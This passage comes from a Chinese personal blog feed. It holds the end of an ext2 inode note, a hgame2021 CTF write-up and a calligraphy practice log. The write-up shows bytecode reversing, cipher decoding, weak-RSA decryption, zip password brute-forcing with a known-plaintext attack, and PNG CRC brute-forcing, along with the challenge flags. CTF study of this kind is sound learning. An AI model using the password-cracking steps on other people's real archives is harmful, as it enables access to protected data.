<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ext2_inode</span> &#123;</span></span><br><span class="line">    u16 i_mode; 		<span class="comment">// 16 bits = | tttt | ugs | rwx | rwx | rwx |</span></span><br><span class="line">    u16 i_uid;			<span class="comment">// owner uid</span></span><br><span class="line">    u32 i_size;			<span class="comment">// file size in bytes</span></span><br><span class="line">    u32 i_atime; 		<span class="comment">// time fields in seconds</span></span><br><span class="line">    u32 i_ctime;		<span class="comment">// since 00:00:00,1-1-1970</span></span><br><span class="line">    u32 i_mtime;</span><br><span class="line">    u32 i_dtime;</span><br><span class="line">    u16 i_gid;			<span class="comment">// group ID</span></span><br><span class="line">    u16 i_links_count;	<span class="comment">// hard-link count</span></span><br><span class="line">    u32 i_blocks;		<span class="comment">// number of 512-byte sectors</span></span><br><span class="line">    u32 i_flags;		<span class="comment">// IGNORE</span></span><br><span class="line">    u32 i_reserved1;	<span class="comment">// IGNORE</span></span><br><span class="line">    u32 i_block[<span class="number">15</span>];	</span><br><span class="line">    u32 i_pad[<span class="number">7</span>];		<span class="comment">// for inode size = 128 bytes</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="i-mode"><a href="#i-mode" class="headerlink" title="i_mode"></a>i_mode</h4><p>是 16 位无符号数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>i_mode 位</th>
<th>tttt</th>
<th>ugs</th>
<th>rwx</th>
<th>rwx</th>
<th>rwx</th>
</tr>
</thead>
<tbody>
<tr>
<td>描述</td>
<td>表示文件类型<br>tttt=1000表示REG文件<br>0100表示DIR文件</td>
<td>表示文件的特殊用法</td>
<td>表示文件权限</td>
<td>表示文件权限</td>
<td>表示文件权限</td>
</tr>
</tbody>
</table>
</div>
<h4 id="各时间字段"><a href="#各时间字段" class="headerlink" title="各时间字段"></a>各时间字段</h4><p>这些字段都是用自 <code>1970-1-1 00:00:00</code> 开始经过的秒数表示的，所以每个字段都是极大的无符号整数，可以借助库函数<code>char *ctime(&amp;time_field);</code>将其转为日历形式。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ctime(&amp;inode.i_atime));</span><br></pre></td></tr></table></figure>
<h4 id="i-block-15"><a href="#i-block-15" class="headerlink" title="i_block[15]"></a>i_block[15]</h4><p>包含指向文件磁盘块的指针，如</p>
<ul>
<li>直接块：i_block[0] 至 i_block[11]，指向直接磁盘块</li>
<li>间接块：i_block[12]</li>
<li>双重间接块：i_block[13]</li>
<li>三重间接块：i_block[14]</li>
</ul>
<h3 id="11-6-数据块"><a href="#11-6-数据块" class="headerlink" title="11.6 数据块"></a>11.6 数据块</h3><p>紧跟在索引节点块后面的是文件存储数据块，假设有 184 个索引节点，第一个实际数据块是 B33，它就是根目录 <code>/</code> 的i_block[0]。</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame2021部分WP</title>
    <url>/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/</url>
    <content><![CDATA[<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="pypy"><a href="#pypy" class="headerlink" title="pypy"></a>pypy</h3><ol>
<li>题目所给的时Python字节码，如下</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  4           0 LOAD_GLOBAL              0 (input)</span><br><span class="line">              2 LOAD_CONST               1 (&#x27;give me your flag:\n&#x27;)</span><br><span class="line">              4 CALL_FUNCTION            1</span><br><span class="line">              6 STORE_FAST               0 (raw_flag)</span><br><span class="line"></span><br><span class="line">  5           8 LOAD_GLOBAL              1 (list)</span><br><span class="line">             10 LOAD_FAST                0 (raw_flag)</span><br><span class="line">             12 LOAD_CONST               2 (6)</span><br><span class="line">             14 LOAD_CONST               3 (-1)</span><br><span class="line">             16 BUILD_SLICE              2</span><br><span class="line">             18 BINARY_SUBSCR</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 STORE_FAST               1 (cipher)</span><br><span class="line"></span><br><span class="line">  6          24 LOAD_GLOBAL              2 (len)</span><br><span class="line">             26 LOAD_FAST                1 (cipher)</span><br><span class="line">             28 CALL_FUNCTION            1</span><br><span class="line">             30 STORE_FAST               2 (length)</span><br><span class="line"></span><br><span class="line">  8          32 LOAD_GLOBAL              3 (range)</span><br><span class="line">             34 LOAD_FAST                2 (length)</span><br><span class="line">             36 LOAD_CONST               4 (2)</span><br><span class="line">             38 BINARY_FLOOR_DIVIDE</span><br><span class="line">             40 CALL_FUNCTION            1</span><br><span class="line">             42 GET_ITER</span><br><span class="line">        &gt;&gt;   44 FOR_ITER                54 (to 100)</span><br><span class="line">             46 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  9          48 LOAD_FAST                1 (cipher)</span><br><span class="line">             50 LOAD_CONST               4 (2)</span><br><span class="line">             52 LOAD_FAST                3 (i)</span><br><span class="line">             54 BINARY_MULTIPLY</span><br><span class="line">             56 LOAD_CONST               5 (1)</span><br><span class="line">             58 BINARY_ADD</span><br><span class="line">             60 BINARY_SUBSCR</span><br><span class="line">             62 LOAD_FAST                1 (cipher)</span><br><span class="line">             64 LOAD_CONST               4 (2)</span><br><span class="line">             66 LOAD_FAST                3 (i)</span><br><span class="line">             68 BINARY_MULTIPLY</span><br><span class="line">             70 BINARY_SUBSCR</span><br><span class="line">             72 ROT_TWO</span><br><span class="line">             74 LOAD_FAST                1 (cipher)</span><br><span class="line">             76 LOAD_CONST               4 (2)</span><br><span class="line">             78 LOAD_FAST                3 (i)</span><br><span class="line">             80 BINARY_MULTIPLY</span><br><span class="line">             82 STORE_SUBSCR</span><br><span class="line">             84 LOAD_FAST                1 (cipher)</span><br><span class="line">             86 LOAD_CONST               4 (2)</span><br><span class="line">             88 LOAD_FAST                3 (i)</span><br><span class="line">             90 BINARY_MULTIPLY</span><br><span class="line">             92 LOAD_CONST               5 (1)</span><br><span class="line">             94 BINARY_ADD</span><br><span class="line">             96 STORE_SUBSCR</span><br><span class="line">             98 JUMP_ABSOLUTE           44</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;  100 BUILD_LIST               0</span><br><span class="line">            102 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 13         104 LOAD_GLOBAL              3 (range)</span><br><span class="line">            106 LOAD_FAST                2 (length)</span><br><span class="line">            108 CALL_FUNCTION            1</span><br><span class="line">            110 GET_ITER</span><br><span class="line">        &gt;&gt;  112 FOR_ITER                26 (to 140)</span><br><span class="line">            114 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line"> 14         116 LOAD_FAST                4 (res)</span><br><span class="line">            118 LOAD_METHOD              4 (append)</span><br><span class="line">            120 LOAD_GLOBAL              5 (ord)</span><br><span class="line">            122 LOAD_FAST                1 (cipher)</span><br><span class="line">            124 LOAD_FAST                3 (i)</span><br><span class="line">            126 BINARY_SUBSCR</span><br><span class="line">            128 CALL_FUNCTION            1</span><br><span class="line">            130 LOAD_FAST                3 (i)</span><br><span class="line">            132 BINARY_XOR</span><br><span class="line">            134 CALL_METHOD              1</span><br><span class="line">            136 POP_TOP</span><br><span class="line">            138 JUMP_ABSOLUTE          112</span><br><span class="line"></span><br><span class="line"> 15     &gt;&gt;  140 LOAD_GLOBAL              6 (bytes)</span><br><span class="line">            142 LOAD_FAST                4 (res)</span><br><span class="line">            144 CALL_FUNCTION            1</span><br><span class="line">            146 LOAD_METHOD              7 (hex)</span><br><span class="line">            148 CALL_METHOD              0</span><br><span class="line">            150 STORE_FAST               4 (res)</span><br><span class="line"></span><br><span class="line"> 16         152 LOAD_GLOBAL              8 (print)</span><br><span class="line">            154 LOAD_CONST               6 (&#x27;your flag: &#x27;)</span><br><span class="line">            156 LOAD_FAST                4 (res)</span><br><span class="line">            158 BINARY_ADD</span><br><span class="line">            160 CALL_FUNCTION            1</span><br><span class="line">            162 POP_TOP</span><br><span class="line">            164 LOAD_CONST               0 (None)</span><br><span class="line">            166 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span><br></pre></td></tr></table></figure>
<ol>
<li>将字节码翻译为Python代码，<a href="https://www.cnblogs.com/yinguohai/p/11158492.html">参考</a></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">raw_flag = <span class="built_in">input</span>(<span class="string">&#x27;give me your flag:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">list</span>(raw_flag[<span class="number">6</span>:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">length = <span class="built_in">len</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">    cipher[<span class="number">2</span>*i], cipher[<span class="number">2</span>*i + <span class="number">1</span>] = cipher[<span class="number">2</span>*i + <span class="number">1</span>], cipher[<span class="number">2</span>*i]</span><br><span class="line"></span><br><span class="line">rse = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    res.append(<span class="built_in">ord</span>(cipher[i]) ^ i)</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">bytes</span>(res).<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;your flag: &#x27;</span>, res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># your flag: 30466633346f59213b4139794520572b45514d61583151576638643a</span></span><br></pre></td></tr></table></figure>
<ol>
<li>解密代码为</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">res = &#x27;30466633346f59213b4139794520572b45514d61583151576638643a&#x27;</span><br><span class="line">res_b = bytes.fromhex(res)</span><br><span class="line">print(res_b)</span><br><span class="line"></span><br><span class="line">cipher = []</span><br><span class="line">for i in range(len(res_b)):</span><br><span class="line">    cipher.append(chr(res_b[i] ^ i))</span><br><span class="line">print(cipher)</span><br><span class="line"></span><br><span class="line">for i in range(len(cipher) // 2):</span><br><span class="line">    cipher[2*i], cipher[2*i + 1] = cipher[2*i + 1], cipher[2*i]</span><br><span class="line"></span><br><span class="line">print(cipher)</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in cipher:</span><br><span class="line">    flag += i</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<ol>
<li>结果为<code>G00dj0&amp;_H3r3-I$Y@Ur_$L@G!~!~</code></li>
</ol>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="まひと"><a href="#まひと" class="headerlink" title="まひと"></a>まひと</h3><ol>
<li>下载文件并打开，时<a href="https://tool.lu/morse/">morse电码</a>，解码得到</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">86/109/108/110/90/87/53/108/99/109/85/116/84/71/108/114/97/84/112/57/86/109/116/116/100/107/112/105/73/84/70/89/100/69/70/52/90/83/70/111/99/69/48/120/101/48/48/114/79/88/104/120/101/110/74/85/84/86/57/79/97/110/53/106/85/109/99/48/101/65/61/61</span><br></pre></td></tr></table></figure>
<ol>
<li><a href="http://www.ab126.com/goju/1711.html">十进制转ASCII</a></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VmlnZW5lcmUtTGlraTp9VmttdkpiITFYdEF4ZSFocE0xe00rOXhxenJUTV9Oan5jUmc0eA==</span><br></pre></td></tr></table></figure>
<ol>
<li><a href="http://tool.chinaz.com/Tools/Base64.aspx">base64解码</a></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Vigenere-Liki:&#125;VkmvJb!1XtAxe!hpM1&#123;M+9xqzrTM_Nj~cRg4x</span><br></pre></td></tr></table></figure>
<ol>
<li>维吉尼亚加密，且密钥为Liki，<a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">解密</a></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#125;KccnYt!1NlPpu!zeE1&#123;C+9pfrhLB_Fz~uGy4n</span><br></pre></td></tr></table></figure>
<ol>
<li>因为明文中是包含hgame的，因此必有移位，遍历以下移位后结果中包含hgame的</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caesar</span>(<span class="params">c, n</span>):</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) + n &gt; <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">                tmp += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + n)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;A&#x27;</span> &lt;= i &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) + n &gt; <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">                tmp += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + n) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + n)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp += i</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;&#125;KccnYt!1NlPpu!zeE1&#123;C+9pfrhLB_Fz~uGy4n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">26</span>):</span><br><span class="line">    res = caesar(c, i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;h&#x27;</span> <span class="keyword">in</span> res <span class="keyword">and</span> <span class="string">&#x27;g&#x27;</span> <span class="keyword">in</span> res <span class="keyword">and</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">in</span> res <span class="keyword">and</span> <span class="string">&#x27;m&#x27;</span> <span class="keyword">in</span> res <span class="keyword">and</span> <span class="string">&#x27;e&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(i, res)</span><br></pre></td></tr></table></figure>
<p>结果为移位13时包含，字符串为<code>&#125;XppaLg!1AyCch!mrR1&#123;P+9cseuYO_Sm~hTl4a</code></p>
<ol>
<li>根据括号的位置可以判断还有一层<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码</a>，尝试发现每组字数6，得到<code>&#125;!!Pu~X1m+YhpAr9OTpyRc_laC1sS4Lc&#123;emagh</code>字符串反转一下得到flag<br><code>hgame&#123;cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!&#125;</code></li>
</ol>
<h3 id="WhitegiveRSA"><a href="#WhitegiveRSA" class="headerlink" title="WhitegiveRSA"></a>WhitegiveRSA</h3><p>确实白给</p>
<ol>
<li>先大数分解得到p和q分别为857504083339712752489993810777和1029224947942998075080348647219</li>
<li>python代码如下</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">n = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line"></span><br><span class="line">phn = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phn)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m)</span><br><span class="line">hgame&#123;w0w~yOU_kNoW+R5@!&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Week-1"><a href="#Week-1" class="headerlink" title="Week-1"></a>Week-1</h3><h4 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h4><ol>
<li>下载得到一个jpg文件，用010Editor打开，发现末尾有<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205182515082-1100501877.png" alt="img"></li>
<li>因此推测jpg中包含zip文件，且口令为8位数字</li>
<li>用<code>foremost</code>分离出zip文件，并使用Advanced Archive Password Recovery暴力破解，得到口令为70415155<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205182659017-1641881824.png" alt="img"></li>
<li>成功解压缩，得到两个文件<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205182815525-936857325.png" alt="img"></li>
<li>发现plain.zip中还有个NO PASSWORD.txt且没有更多的提示，因此应该是利用这个文本文件进行已知明文攻击，<a href="https://www.freebuf.com/column/201834.html">参考</a></li>
<li>在ARCHPR中添加待解密的文件和我们自己压缩的文件，最初在此遇到了报错<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205192155961-726823374.png" alt="img"></li>
<li>因此换成winRAR进行压缩，在压缩前查看了已有的待破解压缩包的属性有<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205192308859-2090258580.png" alt="img"></li>
<li>因此将NO PASSWORD.txt以同样的方式进行压缩<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205192503486-1257249965.png" alt="img"></li>
<li>现在可以成功开始<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205191829314-1614910917.png" alt="img"></li>
<li>最终得到口令为<code>C8uvP$DP</code><br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205191635232-64676140.png" alt="img"></li>
<li>解压plain.zip得到其中的flag.zip，由于没有更多的提示，所以用010Editor查看以下，得到以下信息<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210205193325838-808112916.png" alt="img"></li>
<li>将这段值复制出来转成ASCII即可得到flag为<code>hgame&#123;2IP_is_Usefu1_and_Me9umi_i5_W0r1d&#125;</code></li>
</ol>
<h4 id="Galaxy"><a href="#Galaxy" class="headerlink" title="Galaxy"></a>Galaxy</h4><ol>
<li>下载pcapng文件，拖到wireshark看下，根据提示有一张星空壁纸，所以先搜索有无png<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210204131758807-2053449048.png" alt="img"></li>
<li>双击这条，然后找到PNG文件流所在位置，复制hex流<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210204132011665-132076002.png" alt="img"></li>
<li>用Python将其转为文件</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">m= <span class="string">&#x27;将复制好的hex流粘贴至此&#x27;</span></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(binascii.a2b_hex(m))</span><br></pre></td></tr></table></figure>
<ol>
<li><p>打开得到的png文件却提示<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210204132553314-1711178279.png" alt="img"></p>
</li>
<li><p>用010Editor打开提示CRC校验错误，看一下图片宽高，因此可能是高度有错，通过CRC爆破即可，这里<a href="https://www.cnblogs.com/vict0r/p/13258286.html">参考以前的一篇博客</a>，只需改下图片名即可</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xFFFF</span>):</span><br><span class="line">    stream = img[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + img[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc = binascii.crc32(stream)</span><br><span class="line">    <span class="keyword">if</span> crc == bytes_to_long(img[<span class="number">29</span>:<span class="number">33</span>]):</span><br><span class="line">         <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br></pre></td></tr></table></figure>
<ol>
<li>输出结果1000，因此将高度改为1000即可看到flag<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210204135503380-1975608760.png" alt="img"><br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210204134930355-452339744.png" alt="img"></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Wh4t_A_W0nderfu1_Wa11paper&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h4><ol>
<li>解压缩发现两个文件，maimai.docx需要口令，因此推测first中有关键信息<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210203114859814-1447808314.png" alt="img"><br>查看文件属性也可以发现提示<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210203115619832-1577315799.png" alt="img"></li>
<li>binwalk查看<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210203115133464-350777653.png" alt="img"></li>
<li><code>binwalk -e first.docx</code>分离文件，发现有个password.xml<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210203115205594-2038178067.png" alt="img"></li>
<li>打开后得到<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210203115307122-172594745.png" alt="img"></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;</span><br></pre></td></tr></table></figure>
<ol>
<li><p><a href="https://www.splitbrain.org/services/ook">Brainfuck解密</a>，得到<code>DOYOUKNOWHIDDEN?</code></p>
</li>
<li><p>用其成功打开maimai.docx<br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210209214429338-1967940101.png" alt="img"></p>
</li>
<li><p>请教大佬，发现是snow隐写<a href="https://www.cnblogs.com/GH-D/p/8087762.html">参考</a></p>
</li>
<li><p>将docx导出txt文件</p>
</li>
<li><p><code>SNOW.EXE -C maimai.txt</code><br><img src="/2021/02/03/hgame2021%E9%83%A8%E5%88%86WP/1931211-20210209214653205-305387857.png" alt="img"></p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;Cha11en9e_Whit3_P4ND0R4_P4R4D0XXX&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>X的笔法</title>
    <url>/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/</url>
    <content><![CDATA[<h2 id="大林寺桃花——白居易"><a href="#大林寺桃花——白居易" class="headerlink" title="大林寺桃花——白居易"></a>大林寺桃花——白居易</h2><p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20220104205306437.png" alt="image-20220104205306437"></p>
<p>小结</p>
<p>“菲”的“艹”头与下方“非”间隔须有控制，另“艹”头写法还需练习；</p>
<p>“寺”字中间两横长短不宜差别多大，否则体态过于臃肿、扭曲；</p>
<p>“恨”字竖心所在位置应往上大约1/3的位置，更加优雅自然；</p>
<p>“处”字，左边过于庞大肥胖，应稍瘦，更加干练。</p>
<h2 id="寄全椒山中道士——韦应物"><a href="#寄全椒山中道士——韦应物" class="headerlink" title="寄全椒山中道士——韦应物"></a>寄全椒山中道士——韦应物</h2><p>2021.12.30</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230214305535.png" alt="image-20211230214305535"></p>
<p>小结：书写时，不要操之过急，应快慢有度，稍微注意字的结构布局即可，另外，荆字写错了。hhh</p>
<h2 id="春江花月夜——张若虚"><a href="#春江花月夜——张若虚" class="headerlink" title="春江花月夜——张若虚"></a>春江花月夜——张若虚</h2><p>2021.12.30</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230214203501.png" alt="image-20211230214203501"></p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230214220266.png" alt="image-20211230214220266"></p>
<p>小结：像“丁”字这样，收笔时不宜太过僵硬，潇洒走得快些可以行云流水。</p>
<h2 id="如梦令·昨夜雨疏风骤——李清照"><a href="#如梦令·昨夜雨疏风骤——李清照" class="headerlink" title="如梦令·昨夜雨疏风骤——李清照"></a>如梦令·昨夜雨疏风骤——李清照</h2><p>2021.12.30</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230214123947.png" alt="image-20211230214123947"></p>
<h2 id="醉花阴·薄雾浓云愁永昼——李清照"><a href="#醉花阴·薄雾浓云愁永昼——李清照" class="headerlink" title="醉花阴·薄雾浓云愁永昼——李清照"></a>醉花阴·薄雾浓云愁永昼——李清照</h2><p>2021.12.30</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230214044582.png" alt="image-20211230214044582"></p>
<h2 id="锦瑟——李商隐"><a href="#锦瑟——李商隐" class="headerlink" title="锦瑟——李商隐"></a>锦瑟——李商隐</h2><p>2021.12.30</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230213944098.png" alt="image-20211230213944098"></p>
<p>小结：该文抄写时放得比较开，书写流畅，快慢结合较为合理。</p>
<h2 id="兰亭集序——王羲之"><a href="#兰亭集序——王羲之" class="headerlink" title="兰亭集序——王羲之"></a>兰亭集序——王羲之</h2><p>2021.12.29</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230213821212-16408715026401.png" alt="image-20211230213821212"></p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230213843475.png" alt="image-20211230213843475"></p>
<h2 id="记承天寺夜游——苏轼"><a href="#记承天寺夜游——苏轼" class="headerlink" title="记承天寺夜游——苏轼"></a>记承天寺夜游——苏轼</h2><p>2021.12.29</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230213743339.png" alt="image-20211230213743339"></p>
<h2 id="沁园春·雪——毛泽东"><a href="#沁园春·雪——毛泽东" class="headerlink" title="沁园春·雪——毛泽东"></a>沁园春·雪——毛泽东</h2><p>2021.12.29</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230213655371.png" alt="image-20211230213655371"></p>
<h2 id="山居秋暝——王维"><a href="#山居秋暝——王维" class="headerlink" title="山居秋暝——王维"></a>山居秋暝——王维</h2><p>2021.12.29</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230213601465.png" alt="image-20211230213601465"></p>
<h2 id="定风波·莫听穿林打叶声——苏轼"><a href="#定风波·莫听穿林打叶声——苏轼" class="headerlink" title="定风波·莫听穿林打叶声——苏轼"></a>定风波·莫听穿林打叶声——苏轼</h2><p>2021.12.28</p>
<p><img src="/2021/12/28/x%E7%9A%84%E7%AC%94%E6%B3%95/image-20211230213421789.png" alt="image-20211230213421789"></p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
      </categories>
      <tags>
        <tag>钢笔书法</tag>
      </tags>
  </entry>
  <entry>
    <title>信息物理系统的攻击检测与安全状态估计 笔记</title>
